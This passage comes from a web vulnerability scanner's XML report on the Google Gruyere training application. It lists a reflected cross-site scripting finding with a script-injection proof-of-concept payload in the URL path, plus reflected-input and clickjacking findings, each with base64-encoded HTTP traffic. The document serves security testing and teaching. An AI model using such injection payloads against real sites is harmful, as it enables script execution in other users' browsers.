    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>um7u0&lt;script&gt;alert(1)&lt;/script&gt;kf24h</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bHVtN3UwJTNjc2NyaXB0JTNlYWxlcnQoMSklM2Mvc2NyaXB0JTNla2YyNGggSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogOGZmYTZhYWRiODgxNDlmYmQ3ODc3ZTM1MDZiNjBlODENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MzoxOCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY3MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL3VwbG9hZC5ndGx1bTd1MDxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5rZjI0aDwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3822381625835474944</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/upload.gtl [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bDkwdHh4ZmJlZnYgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNDUzMDFkNGQ1YjM0MmY3Y2QzYjlkOWZjZmQyNjc4OTUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MzowMCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY1NA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPlVucmVjb2duaXplZCBmaWxlIHR5cGUgKC91cGxvYWQuZ3RsOTB0eHhmYmVmdikuPC9kaXY+CgoKPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2637831004196804608</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/5]]></path>
    <location><![CDATA[/5]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC81IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMDIzZTYwY2U0MTZiZGQ0ZGJlNzJlZGZiNTg1NzJmNDMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMjozMiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6509969584806516736</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/5/]]></path>
    <location><![CDATA[/5/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC81LyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNmNkMmUyYWVhOGM5NDQ4YWUwMzYyY2NjNTI1MDdlNWUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozNzozMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3925949143388821504</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/6]]></path>
    <location><![CDATA[/6]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC82IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
